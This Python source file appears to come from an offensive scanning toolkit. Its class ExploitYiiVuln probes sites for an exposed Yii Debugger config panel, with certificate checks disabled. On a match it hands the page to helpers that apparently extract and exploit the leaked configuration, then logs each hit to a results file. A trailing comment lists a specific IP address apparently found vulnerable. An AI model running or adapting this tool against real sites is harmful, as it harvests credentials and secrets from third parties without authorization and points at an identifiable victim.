# cython: language_level=3

import threading
import urllib3
import requests
import src.utils.generics.generic as UtilsGenerics
from config.params import ConfigConst
from src.vulnerability.disclosure.common.extract_info_2 import Extact_info_Common_2
from src.vulnerability.services.exploit_info import ExploitInfo

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import requests


class ExploitYiiVuln:
    def __init__(self):
        self.YII_CONFIG_LOCATION = ["/debug/default/view?panel=config"]
        self.KEY_TO_FIND = ["<title>Yii Debugger</title>"]
        self.logger_vuln = UtilsGenerics.setup_logging(
            logger_name=f"{ConfigConst.LoggingConfig.LOGGER_VULN_NAME}",
            log_file=ConfigConst.LoggingConfig.VULN_LOG_FILE_PATH,
        )
        self.file_lock = threading.Lock()
        self.RESULT_VULN = ConfigConst.CommonPathConfig.RESULT_VULN
        self.exploit_info = ExploitInfo()
        self.exploit_info_yii = Extact_info_Common_2()

    def run(self, url, session):
        found_yii = []
        success = False

        for yii_loc in self.YII_CONFIG_LOCATION:
            try:
                response_redi_true = session.get(
                    f"{url}{yii_loc}",
                    timeout=10,
                    allow_redirects=True,
                    verify=False,
                ).text
                if any(keyword in response_redi_true for keyword in self.KEY_TO_FIND):
                    found_yii.append(f"{url}{yii_loc}")
                    exploit_info_success = self.exploit_info.run(
                        self.exploit_info_yii.run(response_redi_true),
                        url,
                        f"{url}{yii_loc}",
                        session,
                    )
                    if exploit_info_success:
                        success = True
            except requests.ConnectionError as e:
                break
            except requests.Timeout:
                break
            except requests.RequestException as e:
                if hasattr(e, "response") and e.response:
                    if e.response.is_redirect:
                        continue
                    else:
                        self.logger_vuln.error(
                            f"ExploitYiiVuln - DEBUG error : {e} with url : {url}"
                        )
                        continue
            except Exception as e:
                self.logger_vuln.error(
                    f"ExploitYiiVuln - DEBUG error : {e} with url : {url}"
                )
                continue

        if found_yii:
            for link in found_yii:
                UtilsGenerics.push_result(self, self.RESULT_VULN, f"{link}\n")

        return success


# http://5.249.154.204/debug/default/view?panel=config
